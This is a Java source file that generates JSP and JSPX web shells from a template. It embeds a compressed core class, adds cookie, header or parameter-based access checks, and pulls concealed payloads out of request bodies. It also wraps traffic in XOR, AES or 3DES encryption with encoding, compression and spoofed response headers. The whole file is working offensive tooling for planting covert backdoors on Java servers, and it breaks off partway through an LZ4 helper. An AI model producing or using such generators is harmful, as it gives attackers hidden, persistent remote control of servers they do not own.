package com.reajason.noone.core.generator;

import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
import com.reajason.javaweb.utils.CommonUtil;
import com.reajason.noone.core.NoOneCore;
import com.reajason.noone.core.generator.config.NoOneConfig;
import com.reajason.noone.core.generator.memshell.NoOneStagelessGenerator;
import com.reajason.noone.core.generator.protocol.HttpProtocolMetadata;
import com.reajason.noone.core.generator.transform.TransformDirection;
import com.reajason.noone.core.transform.*;
import com.reajason.noone.server.profile.Profile;
import com.reajason.noone.server.profile.config.*;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * Generates JSP and JSPX web shells by filling stub methods in the template
 * with implementations derived from the Profile configuration.
 * <p>
 * This is the source-code-level counterpart of {@link NoOneStagelessGenerator},
 * which operates at bytecode level via ByteBuddy.
 *
 * @author ReaJason
 */
public class NoOneJavaWebShellGenerator {

    private static final String JSP_TEMPLATE_PATH = "/templates/java/vul-java-server.jsp";
    private static final String JSPX_TEMPLATE_PATH = "/templates/java/vul-java-server.jspx";

    private final NoOneConfig config;
    private final ServletModule servletModule;

    public NoOneJavaWebShellGenerator(NoOneConfig config) {
        this(config, ServletModule.JAVAX);
    }

    public NoOneJavaWebShellGenerator(NoOneConfig config, ServletModule servletModule) {
        this.config = Objects.requireNonNull(config, "config");
        this.servletModule = Objects.requireNonNull(servletModule, "servletModule");
    }

    public String generateJsp() {
        String template = loadTemplate(JSP_TEMPLATE_PATH);
        String filled = fillStubMethods(template);
        return insertExtras(filled, false);
    }

    public String generateJspx() {
        String template = loadTemplate(JSPX_TEMPLATE_PATH);
        String filled = fillStubMethods(template);
        return insertExtras(filled, true);
    }

    // ==================== Template filling ====================

    private String fillStubMethods(String template) {
        String result = template;

        result = result.replace(
                "coreGzipBase64 = \"\"",
                "coreGzipBase64 = \"" + generateCoreGzipBase64() + "\""
        );

        Profile profile = config.getCoreProfile();
        if (profile == null) {
            return result;
        }

        result = result.replace(
                "    private boolean isAuthed(Object request) {\n        return true;\n    }",
                generateIsAuthed(profile.getIdentifier())
        );

        ProtocolConfig protocolConfig = profile.getProtocolConfig();
        if (protocolConfig instanceof HttpProtocolConfig httpConfig) {
            result = result.replace(
                    "    private byte[] getArgFromRequest(Object request) {\n        return null;\n    }",
                    generateGetArgFromRequest(httpConfig.getRequestBodyType(), httpConfig.getRequestTemplate())
            );
            result = result.replace(
                    "    private byte[] wrapResData(byte[] payload) {\n        return payload;\n    }",
                    generateWrapResData(httpConfig.getResponseBodyType(), httpConfig.getResponseTemplate())
            );
            result = result.replace(
                    "    private void wrapResponse(Object response) {\n    }",
                    generateWrapResponse(httpConfig.getResponseStatusCode(), httpConfig.getResponseHeaders())
            );
        }

        TransformationSpec reqSpec = TransformationSpec.parse(profile.getRequestTransformations());
        TransformationSpec resSpec = TransformationSpec.parse(profile.getResponseTransformations());

        if (!isNone(reqSpec)) {
            String keyBase64 = computeKeyBase64(profile.getPassword(), reqSpec.encryption());
            result = result.replace(
                    "    private byte[] transformReqPayload(byte[] input) {\n        return input;\n    }",
                    generateTransformMethod("transformReqPayload", "input", TransformDirection.INBOUND, reqSpec, keyBase64)
            );
        }

        if (!isNone(resSpec)) {
            String keyBase64 = computeKeyBase64(profile.getPassword(), resSpec.encryption());
            result = result.replace(
                    "    private byte[] transformResData(byte[] payload) {\n        return payload;\n    }",
                    generateTransformMethod("transformResData", "payload", TransformDirection.OUTBOUND, resSpec, keyBase64)
            );
        }

        return result;
    }

    private String insertExtras(String content, boolean isJspx) {
        Profile profile = config.getCoreProfile();
        if (profile == null) {
            return content;
        }

        TransformationSpec reqSpec = TransformationSpec.parse(profile.getRequestTransformations());
        TransformationSpec resSpec = TransformationSpec.parse(profile.getResponseTransformations());

        Set<String> needed = collectNeededHelpers(reqSpec, resSpec);
        if (needed.isEmpty()) {
            return content;
        }

        String importBlock = formatExtraImports(collectExtraImports(needed), isJspx);
        String helperBlock = buildHelperMethodBlock(needed);

        String result = content;
        if (!importBlock.isEmpty()) {
            if (isJspx) {
                result = result.replace("<jsp:declaration>", importBlock + "<jsp:declaration>");
            } else {
                result = result.replace("<%!\n", importBlock + "<%!\n");
            }
        }
        if (!helperBlock.isEmpty()) {
            if (isJspx) {
                result = result.replace("\n]]></jsp:declaration>", "\n\n" + helperBlock + "\n]]></jsp:declaration>");
            } else {
                result = result.replace("\n%>\n<%", "\n\n" + helperBlock + "\n%>\n<%");
            }
        }
        return result;
    }

    // ==================== Core bytes generation ====================

    private String generateCoreGzipBase64() {
        try (DynamicType.Unloaded<NoOneCore> unloaded = new ByteBuddy()
                .redefine(NoOneCore.class)
                .name(CommonUtil.generateClassName())
                .visit(TargetJreVersionVisitorWrapper.DEFAULT)
                .make()) {
            return Base64.getEncoder().encodeToString(CommonUtil.gzipCompress(unloaded.getBytes()));
        }
    }

    // ==================== isAuthed ====================

    private String generateIsAuthed(IdentifierConfig identifier) {
        if (identifier == null) {
            return "    private boolean isAuthed(Object request) {\n        return true;\n    }";
        }

        String name = escapeJava(identifier.getName());
        String value = escapeJava(identifier.getValue());
        IdentifierLocation location = identifier.getLocation();
        IdentifierOperator operator = identifier.getOperator() != null
                ? identifier.getOperator() : IdentifierOperator.EQUALS;

        StringBuilder sb = new StringBuilder();
        sb.append("    private boolean isAuthed(Object request) {\n");

        if (location == IdentifierLocation.COOKIE) {
            sb.append("        ").append(servletModule.cookie()).append("[] cookies = ((").append(servletModule.httpServletRequest()).append(") request).getCookies();\n");
            sb.append("        if (cookies != null) {\n");
            sb.append("            for (int i = 0; i < cookies.length; i++) {\n");
            sb.append("                if (\"").append(name).append("\".equals(cookies[i].getName())) {\n");
            sb.append("                    String v = cookies[i].getValue();\n");
            sb.append("                    return ").append(operatorExpr("v", operator, value)).append(";\n");
            sb.append("                }\n");
            sb.append("            }\n");
            sb.append("        }\n");
            sb.append("        return false;\n");
        } else {
            String getter = (location == IdentifierLocation.QUERY_PARAM) ? "getParameter" : "getHeader";
            sb.append("        String v = ((").append(servletModule.httpServletRequest()).append(") request).")
                    .append(getter).append("(\"").append(name).append("\");\n");
            sb.append("        return ").append(operatorExpr("v", operator, value)).append(";\n");
        }

        sb.append("    }");
        return sb.toString();
    }

    private static String operatorExpr(String var, IdentifierOperator op, String value) {
        return switch (op) {
            case EQUALS -> "\"" + value + "\".equals(" + var + ")";
            case CONTAINS -> var + " != null && " + var + ".contains(\"" + value + "\")";
            case STARTS_WITH -> var + " != null && " + var + ".startsWith(\"" + value + "\")";
            case ENDS_WITH -> var + " != null && " + var + ".endsWith(\"" + value + "\")";
        };
    }

    // ==================== getArgFromRequest ====================

    private String generateGetArgFromRequest(HttpRequestBodyType bodyType, String template) {
        if (bodyType == null) {
            return "    private byte[] getArgFromRequest(Object request) {\n        return null;\n    }";
        }

        HttpProtocolMetadata.PrefixSuffixIndexes indexes =
                HttpProtocolMetadata.calculateRequestBodyIndexes(bodyType, template);
        int prefix = indexes != null ? indexes.prefixLength() : 0;
        int suffix = indexes != null ? indexes.suffixLength() : 0;

        StringBuilder sb = new StringBuilder();
        sb.append("    private byte[] getArgFromRequest(Object request) {\n");
        sb.append("        try {\n");

        if (bodyType == HttpRequestBodyType.FORM_URLENCODED) {
            String paramName = HttpProtocolMetadata.extractParameterName(template);
            if (paramName == null) {
                paramName = "q";
            }
            sb.append("            String value = ((").append(servletModule.httpServletRequest()).append(") request).getParameter(\"")
                    .append(escapeJava(paramName)).append("\");\n");
            if (prefix == 0 && suffix == 0) {
                sb.append("            return value.getBytes(\"UTF-8\");\n");
            } else {
                sb.append("            return value.substring(").append(prefix)
                        .append(", value.length() - ").append(suffix).append(").getBytes(\"UTF-8\");\n");
            }
        } else {
            sb.append("            java.io.InputStream in = ((").append(servletModule.httpServletRequest()).append(") request).getInputStream();\n");
            sb.append("            ByteArrayOutputStream bos = new ByteArrayOutputStream();\n");
            sb.append("            byte[] buf = new byte[4096];\n");
            sb.append("            int len;\n");
            sb.append("            while ((len = in.read(buf)) != -1) {\n");
            sb.append("                bos.write(buf, 0, len);\n");
            sb.append("            }\n");
            sb.append("            byte[] body = bos.toByteArray();\n");
            if (prefix == 0 && suffix == 0) {
                sb.append("            return body;\n");
            } else {
                sb.append("            int payloadLen = body.length - ").append(prefix).append(" - ").append(suffix).append(";\n");
                sb.append("            byte[] result = new byte[payloadLen];\n");
                sb.append("            System.arraycopy(body, ").append(prefix).append(", result, 0, payloadLen);\n");
                sb.append("            return result;\n");
            }
        }

        sb.append("        } catch (Exception e) {\n");
        sb.append("            return null;\n");
        sb.append("        }\n");
        sb.append("    }");
        return sb.toString();
    }

    // ==================== Transform methods ====================

    private String generateTransformMethod(String methodName, String paramName,
                                           TransformDirection direction,
                                           TransformationSpec spec, String keyBase64) {
        StringBuilder sb = new StringBuilder();
        sb.append("    private byte[] ").append(methodName).append("(byte[] ").append(paramName).append(") {\n");
        sb.append("        if (").append(paramName).append(" == null) return new byte[0];\n");
        sb.append("        try {\n");
        sb.append("            byte[] data = ").append(paramName).append(";\n");

        boolean needsKey = spec.encryption() != null && spec.encryption() != EncryptionAlgorithm.NONE;
        if (needsKey) {
            sb.append("            byte[] key = decodeBase64(\"").append(keyBase64).append("\");\n");
        }

        if (direction == TransformDirection.INBOUND) {
            appendDecodeStep(sb, spec.encoding());
            appendDecryptStep(sb, spec.encryption());
            appendDecompressStep(sb, spec.compression());
        } else {
            appendCompressStep(sb, spec.compression());
            appendEncryptStep(sb, spec.encryption());
            appendEncodeStep(sb, spec.encoding());
        }

        sb.append("            return data;\n");
        sb.append("        } catch (Exception e) {\n");
        sb.append("            throw new RuntimeException(e);\n");
        sb.append("        }\n");
        sb.append("    }");
        return sb.toString();
    }

    private void appendDecodeStep(StringBuilder sb, EncodingAlgorithm encoding) {
        if (encoding == null || encoding == EncodingAlgorithm.NONE) return;
        String method = switch (encoding) {
            case BASE64 -> "decodeBase64";
            case HEX -> "decodeHex";
            case BIG_INTEGER -> "decodeBigInteger";
            default -> null;
        };
        if (method != null) {
            sb.append("            data = ").append(method).append("(data);\n");
        }
    }

    private void appendEncodeStep(StringBuilder sb, EncodingAlgorithm encoding) {
        if (encoding == null || encoding == EncodingAlgorithm.NONE) return;
        String method = switch (encoding) {
            case BASE64 -> "encodeBase64";
            case HEX -> "encodeHex";
            case BIG_INTEGER -> "encodeBigInteger";
            default -> null;
        };
        if (method != null) {
            sb.append("            data = ").append(method).append("(data);\n");
        }
    }

    private void appendDecryptStep(StringBuilder sb, EncryptionAlgorithm encryption) {
        if (encryption == null || encryption == EncryptionAlgorithm.NONE) return;
        String method = switch (encryption) {
            case XOR -> "xor";
            case AES -> "aesDecrypt";
            case TRIPLE_DES -> "tripleDesDecrypt";
            default -> null;
        };
        if (method != null) {
            sb.append("            data = ").append(method).append("(data, key);\n");
        }
    }

    private void appendEncryptStep(StringBuilder sb, EncryptionAlgorithm encryption) {
        if (encryption == null || encryption == EncryptionAlgorithm.NONE) return;
        String method = switch (encryption) {
            case XOR -> "xor";
            case AES -> "aesEncrypt";
            case TRIPLE_DES -> "tripleDesEncrypt";
            default -> null;
        };
        if (method != null) {
            sb.append("            data = ").append(method).append("(data, key);\n");
        }
    }

    private void appendDecompressStep(StringBuilder sb, CompressionAlgorithm compression) {
        if (compression == null || compression == CompressionAlgorithm.NONE) return;
        String method = switch (compression) {
            case GZIP -> "gzipDecompress";
            case DEFLATE -> "deflateDecompress";
            case LZ4 -> "lz4Decompress";
            default -> null;
        };
        if (method != null) {
            sb.append("            data = ").append(method).append("(data);\n");
        }
    }

    private void appendCompressStep(StringBuilder sb, CompressionAlgorithm compression) {
        if (compression == null || compression == CompressionAlgorithm.NONE) return;
        String method = switch (compression) {
            case GZIP -> "gzipCompress";
            case DEFLATE -> "deflateCompress";
            case LZ4 -> "lz4Compress";
            default -> null;
        };
        if (method != null) {
            sb.append("            data = ").append(method).append("(data);\n");
        }
    }

    // ==================== wrapResData ====================

    private String generateWrapResData(HttpResponseBodyType bodyType, String template) {
        HttpProtocolMetadata.ResponsePrefixSuffix parts =
                HttpProtocolMetadata.calculateResponseParts(bodyType, template);
        byte[] prefixBytes = parts != null ? parts.prefixBytes() : new byte[0];
        byte[] suffixBytes = parts != null ? parts.suffixBytes() : new byte[0];

        if (prefixBytes.length == 0 && suffixBytes.length == 0) {
            return "    private byte[] wrapResData(byte[] payload) {\n        return payload;\n    }";
        }

        String prefixB64 = Base64.getEncoder().encodeToString(prefixBytes);
        String suffixB64 = Base64.getEncoder().encodeToString(suffixBytes);

        StringBuilder sb = new StringBuilder();
        sb.append("    private byte[] wrapResData(byte[] payload) {\n");
        sb.append("        try {\n");

        if (prefixBytes.length > 0) {
            sb.append("            byte[] prefix = decodeBase64(\"").append(prefixB64).append("\");\n");
        } else {
            sb.append("            byte[] prefix = new byte[0];\n");
        }
        if (suffixBytes.length > 0) {
            sb.append("            byte[] suffix = decodeBase64(\"").append(suffixB64).append("\");\n");
        } else {
            sb.append("            byte[] suffix = new byte[0];\n");
        }

        sb.append("            byte[] result = new byte[prefix.length + payload.length + suffix.length];\n");
        sb.append("            int offset = 0;\n");
        sb.append("            if (prefix.length > 0) {\n");
        sb.append("                System.arraycopy(prefix, 0, result, 0, prefix.length);\n");
        sb.append("                offset += prefix.length;\n");
        sb.append("            }\n");
        sb.append("            System.arraycopy(payload, 0, result, offset, payload.length);\n");
        sb.append("            offset += payload.length;\n");
        sb.append("            if (suffix.length > 0) {\n");
        sb.append("                System.arraycopy(suffix, 0, result, offset, suffix.length);\n");
        sb.append("            }\n");
        sb.append("            return result;\n");
        sb.append("        } catch (Exception e) {\n");
        sb.append("            return payload;\n");
        sb.append("        }\n");
        sb.append("    }");
        return sb.toString();
    }

    // ==================== wrapResponse ====================

    private String generateWrapResponse(int statusCode, Map<String, String> headers) {
        if (statusCode <= 0 && (headers == null || headers.isEmpty())) {
            return "    private void wrapResponse(Object response) {\n    }";
        }

        StringBuilder sb = new StringBuilder();
        sb.append("    private void wrapResponse(Object response) {\n");
        sb.append("        ").append(servletModule.httpServletResponse()).append(" res = (").append(servletModule.httpServletResponse()).append(") response;\n");

        if (statusCode > 0) {
            sb.append("        res.setStatus(").append(statusCode).append(");\n");
        }
        if (headers != null) {
            for (Map.Entry<String, String> entry : headers.entrySet()) {
                sb.append("        res.setHeader(\"").append(escapeJava(entry.getKey()))
                        .append("\", \"").append(escapeJava(entry.getValue())).append("\");\n");
            }
        }

        sb.append("    }");
        return sb.toString();
    }

    // ==================== Helper method collection ====================

    private Set<String> collectNeededHelpers(TransformationSpec reqSpec, TransformationSpec resSpec) {
        Set<String> needed = new LinkedHashSet<>();
        collectForSpec(needed, reqSpec, TransformDirection.INBOUND);
        collectForSpec(needed, resSpec, TransformDirection.OUTBOUND);
        return needed;
    }

    private void collectForSpec(Set<String> out, TransformationSpec spec, TransformDirection direction) {
        if (isNone(spec)) return;

        CompressionAlgorithm compression = spec.compression();
        if (compression != null && compression != CompressionAlgorithm.NONE) {
            switch (compression) {
                case GZIP -> {
                    if (direction == TransformDirection.OUTBOUND) out.add("gzipCompress");
                }
                case DEFLATE -> out.add(direction == TransformDirection.INBOUND ? "deflateDecompress" : "deflateCompress");
                case LZ4 -> out.add(direction == TransformDirection.INBOUND ? "lz4Decompress" : "lz4Compress");
                default -> {}
            }
        }

        EncryptionAlgorithm encryption = spec.encryption();
        if (encryption != null && encryption != EncryptionAlgorithm.NONE) {
            switch (encryption) {
                case XOR -> out.add("xor");
                case AES -> {
                    out.add(direction == TransformDirection.INBOUND ? "aesDecrypt" : "aesEncrypt");
                    out.add("cipherHelper");
                }
                case TRIPLE_DES -> {
                    out.add(direction == TransformDirection.INBOUND ? "tripleDesDecrypt" : "tripleDesEncrypt");
                    out.add("cipherHelper");
                }
                default -> {}
            }
        }

        EncodingAlgorithm encoding = spec.encoding();
        if (encoding != null && encoding != EncodingAlgorithm.NONE) {
            switch (encoding) {
                case BASE64 -> out.add(direction == TransformDirection.INBOUND ? "decodeBase64Overload" : "encodeBase64");
                case HEX -> out.add(direction == TransformDirection.INBOUND ? "decodeHex" : "encodeHex");
                case BIG_INTEGER -> out.add(direction == TransformDirection.INBOUND ? "decodeBigInteger" : "encodeBigInteger");
                default -> {}
            }
        }
    }

    private Set<String> collectExtraImports(Set<String> needed) {
        Set<String> imports = new LinkedHashSet<>();

        if (needed.contains("cipherHelper")) {
            imports.add("javax.crypto.Cipher");
            imports.add("javax.crypto.spec.IvParameterSpec");
            imports.add("javax.crypto.spec.SecretKeySpec");
            imports.add("java.security.SecureRandom");
        }
        if (needed.contains("decodeBigInteger") || needed.contains("encodeBigInteger")) {
            imports.add("java.math.BigInteger");
        }
        if (needed.contains("gzipCompress")) {
            imports.add("java.util.zip.GZIPOutputStream");
        }
        if (needed.contains("deflateCompress")) {
            imports.add("java.util.zip.DeflaterOutputStream");
        }
        if (needed.contains("deflateDecompress")) {
            imports.add("java.util.zip.InflaterInputStream");
        }
        if (needed.contains("lz4Compress") || needed.contains("lz4Decompress")) {
            imports.add("java.util.Arrays");
        }

        return imports;
    }

    private String formatExtraImports(Set<String> imports, boolean isJspx) {
        if (imports.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();
        for (String imp : imports) {
            if (isJspx) {
                sb.append("<jsp:directive.page import=\"").append(imp).append("\"/>\n");
            } else {
                sb.append("<%@ page import=\"").append(imp).append("\" %>\n");
            }
        }
        return sb.toString();
    }

    // ==================== Helper method block generation ====================

    private String buildHelperMethodBlock(Set<String> needed) {
        if (needed.isEmpty()) return "";
        StringBuilder sb = new StringBuilder();

        if (needed.contains("decodeBase64Overload")) append(sb, HELPER_DECODE_BASE64_BYTES);
        if (needed.contains("encodeBase64")) append(sb, HELPER_ENCODE_BASE64);
        if (needed.contains("decodeHex")) append(sb, HELPER_DECODE_HEX);
        if (needed.contains("encodeHex")) append(sb, HELPER_ENCODE_HEX);
        if (needed.contains("decodeBigInteger")) append(sb, HELPER_DECODE_BIG_INTEGER);
        if (needed.contains("encodeBigInteger")) append(sb, HELPER_ENCODE_BIG_INTEGER);

        if (needed.contains("xor")) append(sb, HELPER_XOR);
        if (needed.contains("cipherHelper")) {
            append(sb, HELPER_CIPHER_ENCRYPT);
            append(sb, HELPER_CIPHER_DECRYPT);
        }
        if (needed.contains("aesEncrypt")) append(sb, HELPER_AES_ENCRYPT);
        if (needed.contains("aesDecrypt")) append(sb, HELPER_AES_DECRYPT);
        if (needed.contains("tripleDesEncrypt")) append(sb, HELPER_TRIPLE_DES_ENCRYPT);
        if (needed.contains("tripleDesDecrypt")) append(sb, HELPER_TRIPLE_DES_DECRYPT);

        if (needed.contains("gzipCompress")) append(sb, HELPER_GZIP_COMPRESS);
        if (needed.contains("deflateCompress")) append(sb, HELPER_DEFLATE_COMPRESS);
        if (needed.contains("deflateDecompress")) append(sb, HELPER_DEFLATE_DECOMPRESS);
        if (needed.contains("lz4Compress")) append(sb, HELPER_LZ4_COMPRESS);
        if (needed.contains("lz4Decompress")) append(sb, HELPER_LZ4_DECOMPRESS);

        if (sb.isEmpty()) return "";
        while (sb.charAt(sb.length() - 1) == '\n') {
            sb.setLength(sb.length() - 1);
        }
        return sb.toString();
    }

    private static void append(StringBuilder sb, String method) {
        sb.append(method).append("\n\n");
    }

    // ==================== Utilities ====================

    private static String loadTemplate(String path) {
        try (InputStream in = NoOneJavaWebShellGenerator.class.getResourceAsStream(path)) {
            if (in == null) {
                throw new IllegalStateException("Template not found: " + path);
            }
            return new String(in.readAllBytes(), StandardCharsets.UTF_8);
        } catch (IOException e) {
            throw new IllegalStateException("Failed to load template: " + path, e);
        }
    }

    private static boolean isNone(TransformationSpec spec) {
        if (spec == null) return true;
        return spec.compression() == CompressionAlgorithm.NONE
                && spec.encryption() == EncryptionAlgorithm.NONE
                && spec.encoding() == EncodingAlgorithm.NONE;
    }

    private static String computeKeyBase64(String password, EncryptionAlgorithm algorithm) {
        if (algorithm == null || algorithm == EncryptionAlgorithm.NONE) return "";
        String context = switch (algorithm) {
            case XOR -> "XOR";
            case AES -> "AES";
            case TRIPLE_DES -> "TripleDES";
            case NONE -> "";
        };
        byte[] key = TransformSupport.deriveKey(password, context, algorithm.keyLengthBytes());
        return Base64.getEncoder().encodeToString(key);
    }

    private static String escapeJava(String s) {
        if (s == null) return "";
        return s.replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")
                .replace("\r", "\\r")
                .replace("\t", "\\t");
    }

    // ==================== Helper method source code ====================

    private static final String HELPER_DECODE_BASE64_BYTES = """
        private static byte[] decodeBase64(byte[] input) throws Exception {
            if (input == null || input.length == 0) return new byte[0];
            try {
                Class<?> base64Class = Class.forName("java.util.Base64");
                Object decoder = base64Class.getMethod("getDecoder").invoke(null);
                return (byte[]) decoder.getClass().getMethod("decode", byte[].class).invoke(decoder, input);
            } catch (Throwable e) {
                Class<?> decoderClass = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = decoderClass.newInstance();
                String inputStr = new String(input, "UTF-8");
                return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoder, inputStr);
            }
        }""";

    private static final String HELPER_ENCODE_BASE64 = """
        private static byte[] encodeBase64(byte[] input) throws Exception {
            if (input == null || input.length == 0) return new byte[0];
            try {
                Class<?> base64Class = Class.forName("java.util.Base64");
                Object encoder = base64Class.getMethod("getEncoder").invoke(null);
                return (byte[]) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, input);
            } catch (Throwable e) {
                Class<?> encoderClass = Class.forName("sun.misc.BASE64Encoder");
                Object encoder = encoderClass.newInstance();
                String encoded = (String) encoderClass.getMethod("encode", byte[].class).invoke(encoder, input);
                return encoded.replaceAll("\\\\s", "").getBytes("UTF-8");
            }
        }""";

    private static final String HELPER_DECODE_HEX = """
        private static byte[] decodeHex(byte[] input) throws Exception {
            String s = new String(input, "UTF-8").trim().replaceAll("\\\\s+", "");
            if (s.isEmpty()) return new byte[0];
            int len = s.length() / 2;
            byte[] out = new byte[len];
            for (int i = 0; i < len; i++) {
                int hi = Character.digit(s.charAt(i * 2), 16);
                int lo = Character.digit(s.charAt(i * 2 + 1), 16);
                out[i] = (byte) ((hi << 4) | lo);
            }
            return out;
        }""";

    private static final String HELPER_ENCODE_HEX = """
        private static byte[] encodeHex(byte[] input) throws Exception {
            char[] hex = new char[input.length * 2];
            int idx = 0;
            for (int i = 0; i < input.length; i++) {
                int v = input[i] & 0xFF;
                hex[idx++] = Character.forDigit(v >>> 4, 16);
                hex[idx++] = Character.forDigit(v & 0x0F, 16);
            }
            return new String(hex).getBytes("UTF-8");
        }""";

    private static final String HELPER_DECODE_BIG_INTEGER = """
        private static byte[] decodeBigInteger(byte[] input) throws Exception {
            String s = new String(input, "UTF-8").trim();
            if (s.isEmpty()) return new byte[0];
            BigInteger big = new BigInteger(s, Character.MAX_RADIX);
            byte[] withPrefix = big.toByteArray();
            if (withPrefix.length == 0) return new byte[0];
            int offset = 0;
            if (withPrefix[0] == 0 && withPrefix.length > 1) offset = 1;
            if (withPrefix[offset] != 1) throw new IllegalArgumentException("Invalid BigInteger payload");
            int outLen = withPrefix.length - offset - 1;
            if (outLen <= 0) return new byte[0];
            byte[] out = new byte[outLen];
            System.arraycopy(withPrefix, offset + 1, out, 0, outLen);
            return out;
        }""";

    private static final String HELPER_ENCODE_BIG_INTEGER = """
        private static byte[] encodeBigInteger(byte[] input) throws Exception {
            byte[] withPrefix = new byte[input.length + 1];
            withPrefix[0] = 1;
            System.arraycopy(input, 0, withPrefix, 1, input.length);
            BigInteger big = new BigInteger(1, withPrefix);
            String s = big.toString(Character.MAX_RADIX);
            return s.getBytes("UTF-8");
        }""";

    private static final String HELPER_XOR = """
        private static byte[] xor(byte[] input, byte[] key) {
            if (key == null || key.length == 0) return input;
            byte[] out = new byte[input.length];
            for (int i = 0; i < input.length; i++) {
                out[i] = (byte) (input[i] ^ key[i % key.length]);
            }
            return out;
        }""";

    private static final String HELPER_CIPHER_ENCRYPT = """
        private static byte[] cipherEncrypt(String keyAlgorithm, String cipherAlgorithm,
                int ivLen, byte[] plaintext, byte[] keyBytes) throws Exception {
            byte[] iv = new byte[ivLen];
            new SecureRandom().nextBytes(iv);
            Cipher cipher = Cipher.getInstance(cipherAlgorithm);
            SecretKeySpec key = new SecretKeySpec(keyBytes, keyAlgorithm);
            cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(iv));
            byte[] encrypted = cipher.doFinal(plaintext);
            byte[] out = new byte[iv.length + encrypted.length];
            System.arraycopy(iv, 0, out, 0, iv.length);
            System.arraycopy(encrypted, 0, out, iv.length, encrypted.length);
            return out;
        }""";

    private static final String HELPER_CIPHER_DECRYPT = """
        private static byte[] cipherDecrypt(String keyAlgorithm, String cipherAlgorithm,
                int ivLen, byte[] ciphertextWithIv, byte[] keyBytes) throws Exception {
            byte[] iv = new byte[ivLen];
            System.arraycopy(ciphertextWithIv, 0, iv, 0, ivLen);
            int cipherLen = ciphertextWithIv.length - ivLen;
            byte[] encrypted = new byte[cipherLen];
            System.arraycopy(ciphertextWithIv, ivLen, encrypted, 0, cipherLen);
            Cipher cipher = Cipher.getInstance(cipherAlgorithm);
            SecretKeySpec key = new SecretKeySpec(keyBytes, keyAlgorithm);
            cipher.init(Cipher.DECRYPT_MODE, key, new IvParameterSpec(iv));
            return cipher.doFinal(encrypted);
        }""";

    private static final String HELPER_AES_ENCRYPT = """
        private static byte[] aesEncrypt(byte[] data, byte[] key) throws Exception {
            return cipherEncrypt("AES", "AES/CBC/PKCS5Padding", 16, data, key);
        }""";

    private static final String HELPER_AES_DECRYPT = """
        private static byte[] aesDecrypt(byte[] data, byte[] key) throws Exception {
            return cipherDecrypt("AES", "AES/CBC/PKCS5Padding", 16, data, key);
        }""";

    private static final String HELPER_TRIPLE_DES_ENCRYPT = """
        private static byte[] tripleDesEncrypt(byte[] data, byte[] key) throws Exception {
            return cipherEncrypt("DESede", "DESede/CBC/PKCS5Padding", 8, data, key);
        }""";

    private static final String HELPER_TRIPLE_DES_DECRYPT = """
        private static byte[] tripleDesDecrypt(byte[] data, byte[] key) throws Exception {
            return cipherDecrypt("DESede", "DESede/CBC/PKCS5Padding", 8, data, key);
        }""";

    private static final String HELPER_GZIP_COMPRESS = """
        private static byte[] gzipCompress(byte[] input) throws IOException {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            GZIPOutputStream gzip = null;
            try {
                gzip = new GZIPOutputStream(bos);
                gzip.write(input);
                gzip.finish();
            } finally {
                if (gzip != null) gzip.close();
                bos.close();
            }
            return bos.toByteArray();
        }""";

    private static final String HELPER_DEFLATE_COMPRESS = """
        private static byte[] deflateCompress(byte[] input) throws IOException {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            DeflaterOutputStream dos = null;
            try {
                dos = new DeflaterOutputStream(bos);
                dos.write(input);
                dos.finish();
            } finally {
                if (dos != null) dos.close();
                bos.close();
            }
            return bos.toByteArray();
        }""";

    private static final String HELPER_DEFLATE_DECOMPRESS = """
        private static byte[] deflateDecompress(byte[] input) throws IOException {
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            InflaterInputStream iis = null;
            try {
                iis = new InflaterInputStream(new ByteArrayInputStream(input));
                byte[] buf = new byte[4096];
                int n;
                while ((n = iis.read(buf)) > 0) {
                    bos.write(buf, 0, n);
                }
            } finally {
                if (iis != null) iis.close();
                bos.close();
            }
            return bos.toByteArray();
        }""";

    private static final String HELPER_LZ4_COMPRESS = """
        private static byte[] lz4Compress(byte[] input) throws IOException {
            if (input == null || input.length == 0) return new byte[0];
            int hashLog = 16;
            int hashSize = 1 << hashLog;
            int minMatch = 4;
            int maxDist = 0xFFFF;
            int[] table = new int[hashSize];
            Arrays.fill(table, -1);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            int anchor = 0;
            int i = 0;
            int limit = input.length - minMatch;
            while (i <= limit) {
                int h = ((input[i] & 0xFF) | ((input[i+1] & 0xFF) << 8)
                        | ((input[i+2] & 0xFF) << 16) | ((input[i+3] & 0xFF) << 24));
                h = (h * -1640531535) >>> (32 - hashLog);
                int ref = table[h];
                table[h] = i;
                if (ref < 0 || (i - ref) > maxDist
                        || input[ref] != input[i] || input[ref+1] != input[i+1]
                        || input[ref+2] != input[i+2] || input[ref+3] != input[i+3]) {
                    i++;
                    continue;
                }
                int matchLen = minMatch;
                int max = input.length - i;
                while (matchLen < max && input[ref + matchLen] == input[i + matchLen]) matchLen++;
                int literalLen = i - anchor;
                int token = (Math.min(literalLen, 15) << 4) | Math.min(matchLen - minMatch, 15);
                out.write(token);
                if (literalLen >= 15) { int n = literalLen - 15; while (n >= 255) { out.write(255); n -= 255; } out.write(n); }
                if (literalLen > 0) out.write(input, anchor, literalLen);
                int offset = i - ref;
                out.write(offset & 0xFF);
                out.write((offset >>> 8) & 0xFF);
                int matchExtra = matchLen - minMatch;
                if (matchExtra >= 15) { int n = matchExtra - 15; while (n >= 255) { out.write(255); n -= 255; } out.write(n); }
                i += matchLen;
                anchor = i;
            }
            int lastLiterals = input.length - anchor;
            int token = Math.min(lastLiterals, 15) << 4;
            out.write(token);
            if (lastLiterals >= 15) { int n = lastLiterals - 15; while (n >= 255) { out.write(255); n -= 255; } out.write(n); }
            if (lastLiterals > 0) out.write(input, anchor, lastLiterals);
            return out.toByteArray();
        }""";

    private static final String HELPER_LZ4_DECOMPRESS = """
        private static byte[] lz4Decompress(byte[] input) {
            if (input == null || input.length == 0) return new byte[0];
            int minMatch = 4;
            byte[] out = new byte[Math.max(64, input.length * 4)];
            int outPos = 0;
            int inPos = 0;
